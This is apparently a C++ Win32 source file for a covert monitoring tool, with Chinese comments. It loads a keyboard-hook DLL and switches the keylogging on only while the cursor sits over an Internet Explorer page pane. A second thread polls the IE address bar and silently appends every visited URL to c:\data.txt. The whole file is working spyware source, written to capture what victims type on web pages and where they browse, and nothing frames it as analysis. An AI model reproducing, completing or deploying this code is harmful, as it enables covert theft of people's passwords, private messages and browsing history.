// MarkIe.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <stdio.h>
#include <string.h>
typedef BOOL (*StartHook)();
typedef BOOL (*StopHook)();
StartHook NewStartHook;
StopHook NewStopHook;

DWORD WINAPI  FindMainThread(LPVOID lpParam)
{
	BOOL bHook=TRUE;
	while(TRUE)
	{
		Sleep(1000);
		tagPOINT lpPoint;
		HWND hwnd;
		char ClassName[255];
		//得到鼠标当前坐标
		GetCursorPos(&lpPoint);
		//得到当前坐标所在窗体的句柄
		hwnd=WindowFromPoint(lpPoint);
		if(hwnd==NULL)
			return 0;
		//得到窗体的类名
		GetClassName(hwnd,ClassName,255);
		//当鼠标在ie网页显示框架中并且键盘钩子没有安装时，安装钩子
		if(strcmp(ClassName,"Internet Explorer_Server")==0&&bHook)
		{
			//安装钩子
			if(!NewStartHook())
				continue;
			bHook=FALSE;
		}
		//当鼠标没在ie网页显示框架中并且键盘钩子安装时，卸载钩子
		if(strcmp(ClassName,"Internet Explorer_Server")!=0&&!bHook)
		{
			if(!NewStopHook())
				continue;	
			bHook=TRUE;
		}	
	}
	return 0;
}


BOOL UrlFind(char *url)
{
	HWND hwnd;
	char ClassName[255];
	//得到当前活动窗口句柄
	hwnd=GetForegroundWindow();
	//得到当前活动窗口类名
	GetClassName(hwnd,ClassName,255);
	//判断是否是IE窗口
	if(strcmp(ClassName,"IEFrame")!=0)
		return FALSE;
	//是IE窗口则继续查找url地址栏
	hwnd=::FindWindowEx(hwnd,NULL,"WorkerW",NULL);
	if(hwnd==NULL)
		return FALSE;
	hwnd=::FindWindowEx(hwnd,NULL,"ReBarWindow32",NULL);
	if(hwnd==NULL)
		return FALSE;
	hwnd=::FindWindowEx(hwnd,NULL,"ComboBoxEx32",NULL);
	if(hwnd==NULL)
		return FALSE;
	hwnd=::FindWindowEx(hwnd,NULL,"ComboBox",NULL);
	if(hwnd==NULL)
		return FALSE;
	hwnd=::FindWindowEx(hwnd,NULL,"Edit",NULL);
	if(hwnd==NULL)
		return FALSE;
	//向地址栏发送WM_GETTEXT消息，得到网页地址
	SendMessage(hwnd,WM_GETTEXT,1024,(LPARAM)url);
	return TRUE;
}

int DataToFile( char *buff ) 
{ 
	//调用CreateFile函数以只写方式打开一个文件
	HANDLE hFile=CreateFile("c:\\data.txt",GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile==INVALID_HANDLE_VALUE)
	{
		printf("CreateFile error\n");
		return 0;
	}
	//调用SetFilePointer函数调整文件指针位置，移动到文件末尾
	if(SetFilePointer(hFile,0,NULL,FILE_END)==-1)
	{
		printf("SetFilePointer error \n");	
		return 0;	
	}
	DWORD dwWrite;
	//把buff中的内容写入到文件末尾
	if(!WriteFile(hFile,buff,strlen(buff),&dwWrite,NULL))
	{
		printf("WriteFile error \n");
		return 0;
	}
	CloseHandle(hFile);
	return 0;
} 

DWORD WINAPI  FindUrlThread(LPVOID lpParam)
{
	char FirstUrl[512]={0};
	char NextUrl[512]={0};
	char Data[512]={0};
	//循环监控
	while(TRUE)
	{
		::Sleep(500);
		//得到地址栏url
		if(!UrlFind(FirstUrl))
			continue;
		//和上次得到的url比较，不相同则把现在的url写入文件
		if(strcmp(FirstUrl,NextUrl)==0)
			continue;
		strcpy(Data,"\r\n");
		strcat(Data,FirstUrl);
		strcat(Data,"\r\n");
		DataToFile(Data);
		//保存现在得到的url
		strcpy(NextUrl,FirstUrl);
		//变量清空
		memset(FirstUrl,0x00,512);
		memset(Data,0x00,512);
	}
	return 0;
}


int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	//加载键盘记录dll
	HMODULE hModule=LoadLibrary("Keyboard.dll");
	if(hModule==NULL)
	{
		return 0;
	}
	//得到安装钩子函数的地址
	NewStartHook=(StartHook)GetProcAddress(hModule,"StartHook");
	//得到卸载钩子函数的地址
	NewStopHook=(StartHook)GetProcAddress(hModule,"StopHook");
	if(NewStartHook==NULL||NewStopHook==NULL)
	{
		return 0;
	}
	HANDLE hThread[2];
	DWORD dwThreadId;
	//创建线程，用于记录ie地址栏的url
	hThread[0]=::CreateThread(NULL,NULL,FindUrlThread,NULL,NULL,&dwThreadId);
	//创建线程，用于记录键盘输入
	hThread[1]=::CreateThread(NULL,NULL,FindMainThread,NULL,NULL,&dwThreadId);
	//等待线程退出
	::WaitForMultipleObjects(2,hThread,FALSE,INFINITE);
	return 0;
}



